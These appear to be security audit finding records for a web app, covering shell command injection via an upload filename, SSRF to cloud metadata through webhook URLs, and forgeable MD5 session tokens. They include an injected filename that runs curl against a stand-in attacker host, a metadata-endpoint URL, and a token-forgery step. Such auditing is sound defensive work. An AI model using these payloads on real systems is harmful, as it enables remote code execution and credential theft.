findings.title: Command injection in thumbnail generation via upload filename
findings.description: handleUpload interpolates the user-controlled query parameter `name` into a shell command executed via exec(). Source evidence: the value flows from req.query (public, unauthenticated) through path.join into exec() with no escaping. The path.join prefix does not neutralize metacharacters inside the filename.
findings.attacker_capabilities: anonymous-remote: arbitrary visitor able to GET /upload?name=...; no credentials required
findings.trust_boundary: network -> application (untrusted HTTP input executed by the OS shell)
findings.exploit_path: GET /upload?name=x;curl${IFS}attacker.example/p.sh — dest becomes /var/uploads/x;curl..., the backtick command runs ImageMagick's arguments through a shell, executing attacker text as a second command
findings.impact: Remote code execution with the application server's privileges; full takeover of the upload host.
reproduction: Start the fixture app locally (authorized test instance only).
Observe the output of id(1) appearing in the converted-file error log / response side effects.
evidence: pocs/SA-command-injection-dcbc2346/poc.md — captured request and command output

validation.validator: independent model-B, fresh context, findings.json + source only
validation.notes: Confirmed the path is reachable from the public router, that the shell is invoked (not an argument-vector API), and that path.join does not sanitize. No earlier finding duplicates it.

findings.title: Unrestricted outbound request to tenant-supplied webhook URLs
findings.description: fetch_url passes a tenant-supplied URL directly to urlopen with no scheme or host allowlist. Source evidence supports SSRF from the application host (metadata endpoints, internal services). Not yet executed: the audit environment has no running instance of this service, so the PoC was not run.
findings.attacker_capabilities: authenticated-low-priv: any tenant able to register a webhook target
findings.trust_boundary: user -> application -> internal network (server-side fetch pivots into internal space)
findings.exploit_path: Register webhook url=http://169.254.169.254/latest/meta-data/ (or any internal service); trigger the webhook test; read the fetched body returned to the tenant.
findings.impact: Read access to cloud metadata credentials and internal-only services from the application host.
reproduction: NOT EXECUTED — missing prerequisite: no running test instance of the webhook service in the audit environment.
To verify: deploy the fixture in an isolated network, register url=http://169.254.169.254/latest/meta-data/, trigger the webhook, and observe the metadata response body returned to the tenant.

findings.title: Session tokens signed with unsalted MD5
findings.description: signToken hashes the payload with MD5 and no keyed construction, so anyone who can observe a token can forge tokens for arbitrary payloads by hashing the desired payload themselves. Hypothesis pending validation: the audit has not yet confirmed whether these tokens grant anything beyond a convenience cookie.
findings.attacker_capabilities: anonymous-remote: any party that receives or guesses a token (they are not keyed)
findings.trust_boundary: network -> application (forged token accepted as authentication material)
findings.exploit_path: Compute md5(JSON.stringify({user:'admin'})) and present it as the remember-me cookie.
findings.impact: Authentication forgery, assuming the cookie is accepted as an auth credential — validation must confirm the verification path.
reproduction: Pending: locate the verification path for this cookie and confirm md5(payload) is accepted without a server-side secret.
Then replay a forged cookie against an isolated test instance.
